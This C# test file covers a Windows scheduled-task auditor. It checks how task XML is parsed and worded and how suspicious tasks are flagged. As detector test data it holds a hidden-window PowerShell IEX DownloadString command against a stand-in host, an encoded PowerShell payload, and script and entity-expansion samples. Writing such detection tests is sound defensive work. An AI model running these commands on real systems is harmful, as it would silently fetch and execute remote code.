using System.Xml;
using RoninVitals.Models;
using RoninVitals.Services;
using Xunit;

namespace RoninVitals.Tests;

public class ScheduledTaskRulesTests
{
    private static string? NoResolver(string reference) => null;

    private static string TaskXml(string triggers = "", string actions = "", string settings = "", string registration = "", string principal = "") => $"""
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo>{registration}</RegistrationInfo>
          <Triggers>{triggers}</Triggers>
          <Principals>{principal}</Principals>
          <Settings>{settings}</Settings>
          <Actions Context="Author">{actions}</Actions>
        </Task>
        """;

    private static ScheduledTask ParseTask(string xml, string path = @"\Acme\Updater", bool registeredEnabled = true, Func<string, string?>? resolve = null,
        DateTime? lastRun = null, DateTime? nextRun = null, int lastResult = 0, Func<string, string?>? resolveAccount = null) =>
        ScheduledTaskRules.Parse(path, path.Split('\\')[^1], registeredEnabled, lastRun, nextRun, lastResult, xml, resolve ?? NoResolver, resolveAccount ?? NoResolver);

    private static ScheduledTask Task(string path = @"\Acme\Updater", string command = @"C:\Program Files\Acme\update.exe", string arguments = "",
        bool enabled = true, bool hasTrigger = true, string? description = null) =>
        new(path, path.Split('\\')[^1], enabled, Author: null, description, "SYSTEM",
            hasTrigger ? [new TaskTrigger("Every day at 09:00", null, null)] : [],
            [new TaskAction(command, arguments)], TimeSpan.FromHours(72), LastRun: null, NextRun: null, LastResult: 0);

    private const string DailyTrigger = """
        <CalendarTrigger>
          <StartBoundary>2024-01-01T09:00:00</StartBoundary>
          <EndBoundary>2030-12-31T23:59:00</EndBoundary>
          <Repetition><Interval>PT1H</Interval><Duration>P1D</Duration></Repetition>
          <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
        </CalendarTrigger>
        """;

    // ── Triggers: what starts a task, and when it begins and ends ───────────

    [Fact]
    public void Parse_ReadsADailyTriggerWithItsActivationAndStopTimes()
    {
        var trigger = Assert.Single(ParseTask(TaskXml(triggers: DailyTrigger)).Triggers);

        Assert.Equal("Every day at 09:00, repeating every 1 hour for 1 day", trigger.Description);
        Assert.Equal(new DateTime(2024, 1, 1, 9, 0, 0), trigger.Starts);
        Assert.Equal(new DateTime(2030, 12, 31, 23, 59, 0), trigger.Ends);
    }

    [Fact]
    public void Parse_LeavesTimesEmptyWhenTheTaskSetsNone()
    {
        var trigger = Assert.Single(ParseTask(TaskXml(triggers: "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>")).Triggers);

        Assert.Null(trigger.Starts);
        Assert.Null(trigger.Ends);
    }

    [Fact]
    public void Parse_ReadsAWeeklyTriggerWithItsDays()
    {
        const string weekly = """
            <CalendarTrigger><StartBoundary>2024-02-05T18:30:00</StartBoundary>
              <ScheduleByWeek><DaysOfWeek><Monday/><Friday/></DaysOfWeek><WeeksInterval>2</WeeksInterval></ScheduleByWeek></CalendarTrigger>
            """;

        Assert.Equal("Every 2 weeks on Mon, Fri at 18:30", ParseTask(TaskXml(triggers: weekly)).Triggers[0].Description);
    }

    [Fact]
    public void Parse_ReadsStartupLogonIdleAndOneOffTriggersInPlainWords()
    {
        var triggers = """
            <BootTrigger><Delay>PT30S</Delay></BootTrigger>
            <LogonTrigger><UserId>PC\Sam</UserId></LogonTrigger>
            <IdleTrigger/>
            <TimeTrigger><StartBoundary>2025-03-01T07:15:00</StartBoundary></TimeTrigger>
            """;

        var descriptions = ParseTask(TaskXml(triggers: triggers)).Triggers.Select(trigger => trigger.Description);

        Assert.Equal(["When Windows starts, after 30 seconds", @"When PC\Sam signs in", "When the PC is idle", "Once at 07:15"], descriptions);
    }

    [Fact]
    public void Parse_IgnoresATriggerThatIsTurnedOff()
    {
        var task = ParseTask(TaskXml(triggers: "<TimeTrigger><Enabled>false</Enabled><StartBoundary>2025-03-01T07:15:00</StartBoundary></TimeTrigger>"));

        Assert.Empty(task.Triggers);
        Assert.False(task.IsScheduled);
    }

    [Fact]
    public void ParseBoundary_HonoursAUtcOffsetWhenThereIsOne() =>
        Assert.Equal(new DateTimeOffset(2024, 6, 1, 10, 0, 0, TimeSpan.FromHours(2)).LocalDateTime, ScheduledTaskRules.ParseBoundary("2024-06-01T10:00:00+02:00"));

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not a date")]
    public void ParseBoundary_GivesNothingForMissingOrBrokenText(string? text) => Assert.Null(ScheduledTaskRules.ParseBoundary(text));

    // ── Settings: enabled, time limit, account ──────────────────────────────

    [Fact]
    public void Parse_ReadsTheStopLimitAndTheAccount()
    {
        var task = ParseTask(TaskXml(
            settings: "<ExecutionTimeLimit>PT1H</ExecutionTimeLimit>",
            principal: "<Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal>"));

        Assert.Equal(TimeSpan.FromHours(1), task.StopsAfter);
        Assert.Equal("SYSTEM (highest privileges)", task.RunsAs);
    }

    [Fact]
    public void Parse_AssumesWindowsDefaultOf72HoursWhenNoLimitIsWritten() =>
        Assert.Equal(TimeSpan.FromHours(72), ParseTask(TaskXml()).StopsAfter);

    [Fact]
    public void Parse_TreatsAZeroLimitAsNeverStopped() =>
        Assert.Null(ParseTask(TaskXml(settings: "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>")).StopsAfter);

    [Fact]
    public void Parse_TurnsAPersonalAccountIdIntoItsName()
    {
        const string sid = "S-1-5-21-1111-2222-3333-1001";

        var task = ParseTask(TaskXml(principal: $"<Principal><UserId>{sid}</UserId></Principal>"), resolveAccount: id => id == sid ? @"PC\Sam" : null);

        Assert.Equal(@"PC\Sam", task.RunsAs);
    }

    [Fact]
    public void Parse_KeepsTheRawIdWhenItCannotBeNamed() =>
        Assert.Equal("S-1-5-21-9-9-9-500", ParseTask(TaskXml(principal: "<Principal><UserId>S-1-5-21-9-9-9-500</UserId></Principal>")).RunsAs);

    [Fact]
    public void Parse_KeepsAnAccountThatIsAlreadyAName() =>
        Assert.Equal(@"PC\Sam", ParseTask(TaskXml(principal: @"<Principal><UserId>PC\Sam</UserId></Principal>")).RunsAs);

    [Fact]
    public void Parse_NamesTheBuiltInInteractiveGroup() =>
        Assert.Equal("Interactive users", ParseTask(TaskXml(principal: "<Principal><GroupId>S-1-5-4</GroupId></Principal>")).RunsAs);

    [Fact]
    public void Parse_SaysTheUserWhoCreatedItWhenNoAccountIsNamed() =>
        Assert.Equal("The user who created it", ParseTask(TaskXml()).RunsAs);

    [Fact]
    public void Parse_IsDisabledWhenEitherTheLibraryOrTheTaskSaysSo()
    {
        const string trigger = "<LogonTrigger/>";

        Assert.False(ParseTask(TaskXml(triggers: trigger), registeredEnabled: false).IsScheduled);
        Assert.False(ParseTask(TaskXml(triggers: trigger, settings: "<Enabled>false</Enabled>")).IsScheduled);
        Assert.True(ParseTask(TaskXml(triggers: trigger)).IsScheduled);
    }

    [Fact]
    public void Parse_AtaskThatOnlyRunsWhenCalledIsNotScheduled() =>
        Assert.False(ParseTask(TaskXml()).IsScheduled);

    // ── Actions, descriptions and times ─────────────────────────────────────

    [Fact]
    public void Parse_ReadsTheProgramAndExpandsEnvironmentVariables()
    {
        var task = ParseTask(TaskXml(actions: "<Exec><Command>%windir%\\system32\\cleanmgr.exe</Command><Arguments>/autoclean</Arguments></Exec>"));

        var action = Assert.Single(task.Actions);
        Assert.Equal(Environment.ExpandEnvironmentVariables(@"%windir%\system32\cleanmgr.exe"), action.Command);
        Assert.Equal("/autoclean", action.Arguments);
    }

    [Fact]
    public void Parse_NamesAComHandlerActionByItsClassId()
    {
        var task = ParseTask(TaskXml(actions: "<ComHandler><ClassId>{1234-ABCD}</ClassId></ComHandler>"));

        Assert.Equal("COM handler {1234-ABCD}", Assert.Single(task.Actions).Command);
    }

    [Fact]
    public void Parse_KeepsAPlainDescriptionAsWritten() =>
        Assert.Equal("Keeps Acme up to date.", ParseTask(TaskXml(registration: "<Description>Keeps Acme up to date.</Description>")).Description);

    [Fact]
    public void Parse_ResolvesAWindowsResourceReferenceIntoText()
    {
        var task = ParseTask(
            TaskXml(registration: @"<Author>$(@%SystemRoot%\system32\x.dll,-1)</Author><Description>@%SystemRoot%\system32\x.dll,-100</Description>"),
            resolve: reference => reference.EndsWith("-1") ? "Microsoft Corporation" : "Scans for problems.");

        Assert.Equal("Microsoft Corporation", task.Author);
        Assert.Equal("Scans for problems.", task.Description);
    }

    [Fact]
    public void Parse_DropsAReferenceItCannotResolveInsteadOfShowingRawCodes() =>
        Assert.Null(ParseTask(TaskXml(registration: @"<Description>@%SystemRoot%\system32\x.dll,-100</Description>")).Description);

    [Fact]
    public void Parse_TurnsTheOleNeverDateIntoNoTime()
    {
        var task = ParseTask(TaskXml(), lastRun: new DateTime(1899, 12, 30), nextRun: new DateTime(2026, 11, 1, 3, 0, 0));

        Assert.Null(task.LastRun);
        Assert.Equal(new DateTime(2026, 11, 1, 3, 0, 0), task.NextRun);
    }

    [Fact]
    public void Parse_KeepsMarkupInTextAsPlainText_ForTheReportToEscape()
    {
        var task = ParseTask(TaskXml(registration: "<Description>&lt;script&gt;alert(1)&lt;/script&gt;</Description>"));

        Assert.Equal("<script>alert(1)</script>", task.Description);
    }

    [Fact]
    public void Parse_RefusesAnXmlDocumentTypeDeclaration_SoANastyTaskCannotExpandEntities()
    {
        const string xml = """<?xml version="1.0"?><!DOCTYPE task [<!ENTITY a "aaaa">]><Task><RegistrationInfo><Description>&a;</Description></RegistrationInfo></Task>""";

        Assert.Throws<XmlException>(() => ParseTask(xml));
    }

    // ── Wording ─────────────────────────────────────────────────────────────

    [Theory]
    [InlineData(60, "1 hour")]
    [InlineData(90, "1 hour 30 minutes")]
    [InlineData(4320, "3 days")]
    [InlineData(0, "0 seconds")]
    public void FormatDuration_SpeaksInWholeUnits(int minutes, string expected) =>
        Assert.Equal(expected, ScheduledTaskRules.FormatDuration(TimeSpan.FromMinutes(minutes)));

    [Fact]
    public void FormatDuration_UsesSecondsOnlyWhenNothingBiggerIsThere() =>
        Assert.Equal("30 seconds", ScheduledTaskRules.FormatDuration(TimeSpan.FromSeconds(30)));

    [Theory]
    [InlineData(0, "succeeded")]
    [InlineData(0x41303, "has not run yet")]
    [InlineData(0x41301, "running now")]
    [InlineData(unchecked((int)0x80070005), "ended with error 0x80070005")]
    public void DescribeLastResult_ExplainsTheCommonCodes(int code, string expected) =>
        Assert.Equal(expected, ScheduledTaskRules.DescribeLastResult(Task() with { LastResult = code }));

    // ── Things worth a second look ──────────────────────────────────────────

    [Fact]
    public void FindConcerns_IsQuietForAnOrdinaryProgramFilesTask() => Assert.Empty(ScheduledTaskRules.FindConcerns(Task()));

    [Theory]
    [InlineData(@"C:\Users\Sam\AppData\Local\Temp\update.exe")]
    [InlineData(@"C:\Users\Sam\Downloads\setup.exe")]
    [InlineData(@"C:\Users\Public\run.exe")]
    public void FindConcerns_FlagsAProgramStartedFromAnOddFolder(string command) =>
        Assert.Contains("unusual folder", Assert.Single(ScheduledTaskRules.FindConcerns(Task(command: command))));

    [Fact]
    public void FindConcerns_FlagsAnEncodedPowerShellCommand()
    {
        var task = Task(command: "powershell.exe", arguments: "-NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=");

        Assert.Contains("encoded PowerShell", Assert.Single(ScheduledTaskRules.FindConcerns(task)));
    }

    [Fact]
    public void FindConcerns_FlagsAHiddenWindowThatDownloadsText()
    {
        var task = Task(command: "powershell.exe", arguments: "-WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\"");

        Assert.Contains("hidden window", Assert.Single(ScheduledTaskRules.FindConcerns(task)));
    }

    [Fact]
    public void FindConcerns_DoesNotFlagAHiddenWindowOnItsOwn() =>
        Assert.Empty(ScheduledTaskRules.FindConcerns(Task(command: "powershell.exe", arguments: "-WindowStyle Hidden -File C:\\Program Files\\Acme\\sync.ps1")));

    [Fact]
    public void FindConcerns_DoesNotFlagAShortDashEOption() =>
        Assert.Empty(ScheduledTaskRules.FindConcerns(Task(command: "powershell.exe", arguments: "-e ok")));

    // ── Judgment ────────────────────────────────────────────────────────────

    [Fact]
    public void Judge_PassesAndCountsWindowsApartFromOtherPrograms()
    {
        var tasks = new[]
        {
            Task(@"\Microsoft\Windows\Defrag\ScheduledDefrag"),
            Task(@"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan"),
            Task(@"\GoogleUpdateTaskMachineCore"),
            Task(@"\Idle", hasTrigger: false),
        };

        var result = ScheduledTaskRules.Judge(tasks, unreadableCount: 0);

        Assert.Equal(CheckStatus.Pass, result.Status);
        Assert.Contains("3 tasks are set to run", result.ResultText);
        Assert.Contains("2 from Windows", result.ResultText);
        Assert.Contains("1 added by other programs", result.ResultText);
        Assert.Contains("GoogleUpdateTaskMachineCore", result.ResultText);
    }

    [Fact]
    public void Judge_WarnsAndNamesATaskThatStartsFromTemp()
    {
        var tasks = new[] { Task(), Task(@"\Updater1", command: @"C:\Users\Sam\AppData\Local\Temp\x.exe") };

        var result = ScheduledTaskRules.Judge(tasks, unreadableCount: 0);

        Assert.Equal(CheckStatus.Warn, result.Status);
        Assert.Contains("Updater1", result.ResultText);
        Assert.Contains("unusual folder", result.ResultText);
    }

    [Fact]
    public void Judge_MentionsTasksItCouldNotRead()
    {
        var result = ScheduledTaskRules.Judge([Task()], unreadableCount: 2);

        Assert.Contains("2 tasks couldn't be read", result.ResultText);
    }

    [Fact]
    public void Judge_WarnsWhenNoTaskCouldBeRead() =>
        Assert.Equal(CheckStatus.Warn, ScheduledTaskRules.Judge([], unreadableCount: 5).Status);

    // ── Tables ──────────────────────────────────────────────────────────────

    [Fact]
    public void BuildTables_ListsProgramTasksOpenAndWindowsTasksFolded()
    {
        var tasks = new[] { Task(@"\Microsoft\Windows\Defrag\ScheduledDefrag"), Task(@"\Acme\Updater"), Task(@"\Off", enabled: false) };

        var tables = ScheduledTaskRules.BuildTables(tasks);

        Assert.Equal(2, tables.Count);
        Assert.False(tables[0].StartsCollapsed);
        Assert.Equal(@"\Acme\Updater", Assert.Single(tables[0].Rows).Cells[0]);
        Assert.True(tables[1].StartsCollapsed);
        Assert.Contains("1 other task is turned off", tables[1].Note);
        Assert.All(tables, table => Assert.All(table.Rows, row => Assert.Equal(table.Columns.Count, row.Cells.Count)));
    }

    [Fact]
    public void BuildTables_ShowsStartAndStopTimesAndTheStopLimit()
    {
        var task = ParseTask(TaskXml(triggers: DailyTrigger, settings: "<ExecutionTimeLimit>PT1H</ExecutionTimeLimit>",
            actions: @"<Exec><Command>C:\Program Files\Acme\update.exe</Command><Arguments>/silent</Arguments></Exec>",
            registration: "<Description>Keeps Acme up to date.</Description>"),
            nextRun: new DateTime(2026, 11, 2, 9, 0, 0), lastRun: new DateTime(2026, 11, 1, 9, 0, 0));

        var cells = ScheduledTaskRules.BuildTables([task])[0].Rows[0].Cells;

        Assert.Equal("Keeps Acme up to date.", cells[1]);
        Assert.Equal(@"C:\Program Files\Acme\update.exe /silent", cells[2]);
        Assert.Contains("Active from 2024-01-01 09:00", cells[3]);
        Assert.Contains("Stops 2030-12-31 23:59", cells[3]);
        Assert.Equal("2026-11-02 09:00", cells[4]);
        Assert.Equal("2026-11-01 09:00\nsucceeded", cells[5]);
        Assert.Equal("1 hour", cells[7]);
    }

    [Fact]
    public void BuildTables_SaysWhenATaskHasNoDescriptionOrNextRun()
    {
        var cells = ScheduledTaskRules.BuildTables([Task()])[0].Rows[0].Cells;

        Assert.Equal("No description", cells[1]);
        Assert.Equal("Not planned", cells[4]);
    }

    [Fact]
    public void BuildTables_FlagsAnUnusualTaskForAttention()
    {
        var row = ScheduledTaskRules.BuildTables([Task(command: @"C:\Users\Sam\Downloads\a.exe")])[0].Rows[0];

        Assert.Equal(ReportRowEmphasis.Notable, row.Emphasis);
        Assert.Contains("Needs attention", row.Cells[0]);
    }

    [Fact]
    public void BuildTables_SaysWhenATaskIsNeverStoppedAutomatically()
    {
        var task = Task() with { StopsAfter = null };

        Assert.Equal("Never stopped automatically", ScheduledTaskRules.BuildTables([task])[0].Rows[0].Cells[7]);
    }
}
